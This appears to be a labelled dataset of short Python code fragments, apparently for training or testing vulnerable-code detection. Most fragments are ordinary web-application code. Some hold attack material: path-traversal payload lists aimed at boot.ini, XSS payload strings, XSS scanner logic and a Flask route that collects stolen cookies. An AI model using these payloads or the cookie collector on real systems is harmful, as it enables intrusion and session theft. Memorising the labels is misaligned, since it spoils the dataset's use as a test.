referer_header={\"Referer\": referer_header_value} temp_headers.update(referer_header) ref_header_xss=req.api_request", "label": 1}, {"snippet_id": 53566, "code": "]) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_bundle", "label": 0}, {"snippet_id": 31081, "code": " \tsql.update_server_master(master, slave) \t if form.getvalue('masteradd'): \tmaster=form.getvalue('masteradd') \tslave=form.getvalue('slaveadd') \tinterface=form.getvalue('interfaceadd') \tvrrpip=form.getvalue", "label": 0}, {"snippet_id": 7895, "code": ".get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'", "label": 0}, {"snippet_id": 26039, "code": ".pop('request', None) self.validate_vat_id=kwargs.pop('validate_vat_id') self.all_optional=kwargs.pop('all_optional', False) super().__init__(*args, **kwargs) if not event.settings.invoice_address_vatid", "label": 0}, {"snippet_id": 19167, "code": "{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str", "label": 0}, {"snippet_id": 22047, "code": " urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns", "label": 0}, {"snippet_id": 25512, "code": "], code='required') if self.require_all_fields and not all(v for v in value): raise forms.ValidationError(self.error_messages['incomplete'], code='required') return value class BaseQuestionsForm(forms.Form", "label": 0}, {"snippet_id": 14304, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views", "label": 0}, {"snippet_id": 6253, "code": " res=None return res @property def syslog_socket(self): \"\"\" Syslog socket to log to(string). Something like '/dev/log' maybe. \"\"\" res=self.config.get(self.section, 'syslog_socket') if not res: res=None", "label": 0}, {"snippet_id": 10016, "code": " def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store", "label": 1}, {"snippet_id": 12295, "code": "(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index", "label": 0}, {"snippet_id": 33240, "code": ".url)) self.response.write('build %d not found' % build_id) self.abort(404) return self.redirect(str(build.url)) class TaskCancelSwarmingTask(webapp2.RequestHandler): \"\"\"Cancels a swarming task.\"\"\" @decorators", "label": 1}, {"snippet_id": 27194, "code": "-\\ m_reqtype =re.match(r'.*\\<form\\s[^\\>]*method=\"([\\w\\/\\.\\-]+)\"', line, re.M|re.I) if m_action or m_same: has_form=1 form_counter+=1 if m_same: page=\"\" else: page=m_action.group(1) rtype=\"get\" if m_reqtype", "label": 1}, {"snippet_id": 16652, "code": "'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r", "label": 0}, {"snippet_id": 21730, "code": "<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=", "label": 0}, {"snippet_id": 41968, "code": "'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type(value))", "label": 0}, {"snippet_id": 16174, "code": " url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 38732, "code": ") \t\t\t\telse: \t\t\t\t\tdefault=filters \t\t\t\t\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter", "label": 0}, {"snippet_id": 31496, "code": "=dict(logo=None)) \tshow(grid) \t if form.getvalue('waf_metrics'): \tfrom datetime import timedelta \tfrom bokeh.plotting import figure, output_file, show \tfrom bokeh.models import ColumnDataSource, HoverTool", "label": 0}, {"snippet_id": 29379, "code": "(cfg)) \t \terror +=str(upload(serv, tmp_file, cfg, dir='fullpath')) \ttry: \t\terror +=ssh_command(serv, commands) \texcept Exception as e: \t\terror +=e \tif error: \t\treturn error \t\t def open_port_firewalld(cfg", "label": 0}, {"snippet_id": 15136, "code": " FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import", "label": 0}, {"snippet_id": 1924, "code": "\"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update", "label": 0}, {"snippet_id": 16325, "code": "'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$", "label": 0}, {"snippet_id": 38035, "code": "{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"", "label": 0}, {"snippet_id": 381, "code": ".headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, ", "label": 1}, {"snippet_id": 19679, "code": " test suite \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh", "label": 0}, {"snippet_id": 32876, "code": " class=\"doc\">') self.wfile.write('<div class=\"Breadcrumbs\">\\n') self.wfile.write('<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % self.path) self.wfile.write('</div>\\n') for _, dirs, files in os.walk(full_path):", "label": 1}, {"snippet_id": 21893, "code": "]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register", "label": 0}, {"snippet_id": 50272, "code": "(_SERVERNAME, request.getRequestHostname(), request.getHost().port) sess=AjaxWebClientSession() sess.client=self sess.init_session(\"ajax/comet\", remote_addr, self.sessionhandler) sess.csessid=csessid csession", "label": 0}, {"snippet_id": 22615, "code": ".course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+", "label": 0}, {"snippet_id": 23873, "code": "=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True", "label": 0}, {"snippet_id": 21461, "code": "', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 33306, "code": " webapp2.Route(r'/build/<build_id:\\d+>', ViewBuildHandler), ] routes.extend(endpoints_webapp2.api_routes(endpoints_services)) routes.extend( endpoints_webapp2.api_routes(endpoints_services, base_path='/api')", "label": 0}, {"snippet_id": 20925, "code": ".views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=", "label": 0}, {"snippet_id": 42790, "code": " get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch values if not set''' \t\tdef get_msg(df, docname): \t\t\tif self.parentfield: \t\t\t\treturn \"{} \t\t\telse: \t\t\t", "label": 0}, {"snippet_id": 28501, "code": "+\".log\", \"a\") \telif kwargs.get('metrics')==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/metrics-\"+get_data('logs')+\".log\", \"a\") \telif kwargs.get('keep_alive')==1: \t\tmess=get_data", "label": 0}, {"snippet_id": 15915, "code": "/localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches", "label": 0}, {"snippet_id": 43389, "code": " value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small Text\") and df.get(\"options\"", "label": 0}, {"snippet_id": 2311, "code": "(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id", "label": 0}, {"snippet_id": 31940, "code": ".getvalue('group')+\"/\"+form.getvalue('color') \tlists=funct.get_files(dir=list, format=\"lst\") \tfor list in lists: \t\tprint(list) \t\t if form.getvalue('get_ldap_email'): \tusername=form.getvalue('get_ldap_email'", "label": 0}, {"snippet_id": 50634, "code": " on browser session) Returns: csession(ClientSession): This is a django-specific internal representation of the browser session. \"\"\" if self.csessid: return _CLIENT_SESSIONS(session_key=self.csessid) def", "label": 0}, {"snippet_id": 10149, "code": "}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{", "label": 0}, {"snippet_id": 54638, "code": "(DetailView, FormMixin): \"\"\"\u5904\u7406\u5355\u7bc7\u6587\u7ae0\u8be6\u60c5\u9875\u7684\u663e\u793a\u3002 \u4ee5\u53ca\u6240\u6709\u7559\u8a00\u7684\u663e\u793a FormMixin \u5904\u7406\u7559\u8a00\u7684\u4e0a\u4f20 \u3002 \"\"\" model=Article context_object_name='article' template_name='details.html' form_class=CommentForm def get_success_url(self): return", "label": 0}, {"snippet_id": 44217, "code": " import Credentials from liboozie.oozie_api import get_oozie from liboozie.submission2 import Submission from oozie.decorators import check_document_access_permission, check_document_modify_permission from", "label": 0}, {"snippet_id": 22555, "code": "=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings", "label": 0}, {"snippet_id": 18715, "code": "'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 32587, "code": ".exists(full_path): self._DoNotFound() elif path.lower().endswith('.md'): self._DoMD(path) elif os.path.exists(full_path +'/README.md'): self._DoMD(path +'/README.md') elif path.lower().endswith('.png'", "label": 0}, {"snippet_id": 44315, "code": ".check_workspace(request.fs, request.user) workflow_data=workflow.get_data() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e", "label": 0}, {"snippet_id": 31926, "code": "'restart_command')]) \t\t\t if form.getvalue('get_lists'): \tlist=os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color') \tlists=funct.get_files(dir=list,", "label": 0}, {"snippet_id": 43635, "code": "[cache_key][fieldname]=get_field_precision(df, self) \t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False): \t", "label": 0}, {"snippet_id": 51520, "code": ".csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware', 'django_otp", "label": 0}, {"snippet_id": 6535, "code": "\" return self.config.get(self.section, 'sso_session_mongo_uri') @property def raven_dsn(self): \"\"\" Raven DSN(string) for logging exceptions to Sentry. \"\"\" return self.config.get(self.section, 'raven_dsn", "label": 0}, {"snippet_id": 11002, "code": "(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test-db.sh\".format", "label": 0}, {"snippet_id": 28880, "code": " badHostKeyException \t\tpass \texcept Exception as e: \t\tif e==\"No such file or directory\": \t\t\treturn '%s. Check ssh key' % e \t\t\tpass \t\telif e==\"Invalid argument\": \t\t\terror='Check the IP of the server' \t\t\tpass \t\telse: ", "label": 0}, {"snippet_id": 25668, "code": "=None tz=pytz.timezone(event.settings.timezone) help_text=rich_text(q.help_text) if q.type==Question.TYPE_BOOLEAN: if q.required: widget=forms.CheckboxInput(attrs={'required': 'required'}) else: widget", "label": 0}, {"snippet_id": 25498, "code": " dict: value=super().clean(value) if self.one_required and(not value or not any(v for v in value)): raise forms.ValidationError(self.error_messages['required'], code='required') if self.require_all_fields", "label": 0}, {"snippet_id": 40156, "code": " value), frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit(self): \t\t \t\tdb_values=frappe.get_doc(self.doctype, self.name).as_dict() \t\tfor key in self.as_dict", "label": 0}, {"snippet_id": 14402, "code": "), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores", "label": 0}, {"snippet_id": 6751, "code": " constructed from the Request URI, but for example if there is a load balancer/SSL terminator in front of the IdP it might be required to specify the URL of the service. \"\"\" return self.config.get(self.section, ", "label": 0}, {"snippet_id": 21698, "code": "'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'),", "label": 0}, {"snippet_id": 17675, "code": ".index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student", "label": 0}, {"snippet_id": 32572, "code": "() elif path in('/base.css', '/doc.css', '/prettify.css'): self._DoCSS(path[1:]) elif not os.path.exists(full_path): self._DoNotFound() elif path.lower().endswith('.md'): self._DoMD(path) elif os.path.exists", "label": 0}, {"snippet_id": 43284, "code": "\t\tfor key in self.as_dict(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t\tif df and not df.allow_on_submit and(self.get(key) or db_value): \t\t\t\tif df.fieldtype==\"Table\": \t\t\t\t\t \t\t\t\t\t ", "label": 0}, {"snippet_id": 31518, "code": ".SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \tservers=sql.select_waf_servers_metrics(user_id.value) \tservers=sorted(servers) \t \tp={} \tfor serv in servers: \t\tserv=serv[0] \t\tp[serv]={", "label": 0}, {"snippet_id": 48594, "code": ".notes=request.POST[\"notes\"] else: sr.notes=\" \" sr.primary_reservation=GroupReservation.objects.get(id=int(request.GET[\"rid\"])) sr.save() print(request.POST) print(sr.notes) return HttpResponseRedirect", "label": 1}, {"snippet_id": 48460, "code": " write_db_reservation_action(request: HttpRequest): \"\"\" This function is used to submit the reservation \"\"\" u: Profile=get_current_user(request) forward_url=\"/admin?success\" if u.rights > 0: forward_url", "label": 0}, {"snippet_id": 42199, "code": "'Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]", "label": 0}, {"snippet_id": 25015, "code": " \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__", "label": 0}, {"snippet_id": 36708, "code": " Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe", "label": 0}, {"snippet_id": 15411, "code": " msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green'", "label": 0}, {"snippet_id": 20415, "code": ".join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', ", "label": 0}, {"snippet_id": 17386, "code": "-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name", "label": 0}, {"snippet_id": 20533, "code": "(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self", "label": 0}, {"snippet_id": 26683, "code": ".ini', '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e", "label": 0}, {"snippet_id": 14019, "code": "'open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 18653, "code": "/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications", "label": 0}, {"snippet_id": 354, "code": "=fetch_xss_payload() for payload in xss_payloads: if result is not True: xss_url=url.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) if xss_request.text.find(payload) !=-1", "label": 1}, {"snippet_id": 7498, "code": "), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 50241, "code": ".databuffer: del self.databuffer[csessid] def mode_init(self, request): \"\"\" This is called by render_POST when the client requests an init mode operation(at startup) Args: request(Request): Incoming request. ", "label": 0}, {"snippet_id": 18275, "code": "/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(", "label": 1}, {"snippet_id": 25414, "code": "'widget': self.widget, 'max_length': kwargs.pop('max_length', None), } self.scheme_name=kwargs.pop('scheme') self.scheme=PERSON_NAME_SCHEMES.get(self.scheme_name) self.one_required=kwargs.get('required", "label": 0}, {"snippet_id": 28576, "code": "/center>' % e) \t\tpass \t def telegram_send_mess(mess, **kwargs): \timport telebot \tfrom telebot import apihelper \timport sql \t \ttelegrams=sql.get_telegram_by_ip(kwargs.get('ip')) \tproxy=sql.get_setting('proxy'", "label": 0}, {"snippet_id": 27607, "code": " helpers.get_user_email(), 'login_url': login_url, 'switch_account_url': login_url, 'logout_url': make_logout_url(dest_url=self.request.url), 'contact_string': contact_string, } self.render('error-403.html", "label": 0}, {"snippet_id": 15417, "code": "...\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils", "label": 0}, {"snippet_id": 26955, "code": "(furl, data=post_params) if DEBUG==1: print post_params with open(\"response_\" +str(form_counter) +\"_\" +str(counter) +\".html\", \"w\") as f: f.write(r.content) if r.content.find(xss)>=0: print \"[+] Target is", "label": 0}, {"snippet_id": 44755, "code": " _property in properties])) if copied_properties: _properties.update(copied_properties) response['status']=0 response['properties']=_properties response['name']='%s-%s' %(node['widgetType'].split('-')[0], node[", "label": 0}, {"snippet_id": 27434, "code": ".splitlines() def split_br(text): return re.split(r'\\s*<br */>\\s*', text, flags=re.IGNORECASE) def encode_json(value): \"\"\"Dump base64-encoded JSON string(to avoid XSS).\"\"\" return base64.b64encode(json.dumps", "label": 0}, {"snippet_id": 19941, "code": "'save_screenshots', False) def __enter__(self): super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if", "label": 0}, {"snippet_id": 31714, "code": "\"/\"+form.getvalue('bwlists') \ttry: \t\tfile=open(list, \"r\") \t\tfile_read=file.read() \t\tfile.close \t\tprint(file_read) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n read ", "label": 0}, {"snippet_id": 54194, "code": ", text=\"Timeout:\",background='light sky blue').grid(row=3) Label(main, text=\"User-Agent:\",background='light sky blue').grid(row=4) Label(main, text=\"Payload:\",background='light sky blue').grid(row=5) Label", "label": 0}, {"snippet_id": 46074, "code": " permission to access it.\")) query={'qs':[{'q': ''}], 'fqs':[], 'start': 0} if request.method=='GET': if 'q' in request.GET: query['qs'][0]['q']=request.GET.get('q') if 'qd' in request.GET: query['qd']=request", "label": 1}, {"snippet_id": 26911, "code": " for i in range(0,len(params)): for j in range(0, len(params)): if j==i: post_params[params[j]]=xss else: post_params[params[j]]=0 if(len(hidden_param_name) > 0) and(len(hidden_param_name)==len(hidden_param_value", "label": 0}, {"snippet_id": 8038, "code": "[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(", "label": 0}, {"snippet_id": 53203, "code": " request.info(_('Coordinator submitted.')) return redirect(reverse('oozie:list_oozie_coordinator', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else", "label": 0}, {"snippet_id": 50567, "code": ",[None])[0] if dmode=='init': return self.mode_init(request) elif dmode=='input': return self.mode_input(request) elif dmode=='receive': return self.mode_receive(request) elif dmode=='close': return self", "label": 0}, {"snippet_id": 32327, "code": " is not under %s' %(args.file, args.directory)) return 1 rpath=os.path.relpath(path, top_level) url='%s/%s' %(origin, rpath) print('Opening %s' % url) thread=threading.Thread(target=_open_url, args=(url", "label": 0}, {"snippet_id": 47110, "code": "=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\".format( json.dumps(m.json, indent=2, sort_keys=True))) ) column_filters=('created', 'updated',) column_default_sort=('updated', True) page_size=25 def delete_model", "label": 1}, {"snippet_id": 224, "code": "-1: impact=check_xss_impact(xss_request_url.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert", "label": 1}, {"snippet_id": 5507, "code": "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> </head> <body> %s </body> </html> ''' _probes=[ \"\"\"'';!--\"<XSS>=&{()}\"\"\", ] _payloads=[ '<q/oncut=open()>', '<svg/onload=eval(name)", "label": 0}, {"snippet_id": 53977, "code": "\treturn 'Hello ^_^' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt'", "label": 0}, {"snippet_id": 11907, "code": " +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views", "label": 0}, {"snippet_id": 22510, "code": " name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in", "label": 0}, {"snippet_id": 27892, "code": ".headers.get('Content-Type')): self.render_json(values, 500) else: self.render('error.html', values, 500) def redirect(self, url, **kwargs): \"\"\"Explicitly converts url to 'str', because webapp2.RequestHandler", "label": 0}, {"snippet_id": 38709, "code": "\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict): \t\t\t\t\tvalue=_filter(self.__dict__.get(key,[]), filters", "label": 0}, {"snippet_id": 44090, "code": " 'project': TermsFacet(field='project'), 'version': TermsFacet(field='version') } def query(self, search, query): \"\"\" Add query part to ``search`` Overriding because we pass ES Query object instead of string", "label": 0}, {"snippet_id": 20954, "code": "', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views", "label": 0}, {"snippet_id": 14227, "code": "'submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url", "label": 0}, {"snippet_id": 26823, "code": "%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini' ] lfi_expect=['[operating systems]', '[boot", "label": 0}, {"snippet_id": 27203, "code": "/\\.\\-]+)\"', line, re.M|re.I) if m_action or m_same: has_form=1 form_counter+=1 if m_same: page=\"\" else: page=m_action.group(1) rtype=\"get\" if m_reqtype: rtype=m_reqtype.group(1) print \"[+] Form detected", "label": 1}, {"snippet_id": 49132, "code": " self.query_order) }) else: return self.get_url_with_query_params({ self.ordering_query_param: self.column_id }) elif self.current_columns_length > 1: new_query=[] for column in self.query_order.split('.'", "label": 0}, {"snippet_id": 4454, "code": "'\\u04BB', 'i': '\\u0456', 'j': '\\u0458', 'l': '\\u04CF', 'o': '\\u043E', 'p': '\\u0440', 'r': '\\u0433', 'q': '\\u051B', 's': '\\u0455', 'w': '\\u051D', 'x': '\\u0445', 'y': '\\u0443', } def __init__(self): super", "label": 0}, {"snippet_id": 29847, "code": " \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') if form.getvalue('checkSshConnect') is not None and serv is not None: \ttry: \t\tfunct.ssh_command", "label": 0}, {"snippet_id": 41718, "code": " \"__setup__\"): \t\t\tself.__setup__() \t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self._meta \tdef update(self, d): \t\tif \"doctype\" in d", "label": 0}, {"snippet_id": 53232, "code": "'editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_coordinator', kwargs={'doc_id': coordinator.id}) }, force_template=True).content return HttpResponse", "label": 0}, {"snippet_id": 1655, "code": "\" data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) except: print \"Falied to parse\" print \"Data\",data try: if data['id']==\"NA\": all_data={'url': data['url'], 'impact': data['impact'], 'name", "label": 0}, {"snippet_id": 54054, "code": "%Y %H:%M:%S\"))) crl=[target.get()] if crawl.get()=='On': crl+=bane.crawl(target.get(),bypass=True) pr=proxy.get() if len(pr)==0: pr=None if method.get()==\"GET\": get=True post=False elif method.get()==\"POST", "label": 0}, {"snippet_id": 54162, "code": "(background='light sky blue') Label(main, text=\"Target:\",background='light sky blue').grid(row=0) Label(main, text=\"Cookie:(Optional)\",background='light sky blue').grid(row=1) Label(main, text=\"Method:", "label": 0}, {"snippet_id": 1296, "code": " data['scanid'], \"name\": data['name'], \"url\": data['url']}) except: pass return jsonify(scanids) def fetch_records(scanid): vul_list=[] records=db.vulnerabilities.find({\"scanid\":scanid}) print \"Records are", "label": 0}, {"snippet_id": 28835, "code": "\tssh.connect(hostname=serv, port= ssh_port, username=ssh_user_name, password=ssh_user_password) \t\treturn ssh \texcept paramiko.AuthenticationException: \t\treturn 'Authentication failed, please verify your", "label": 0}, {"snippet_id": 24042, "code": 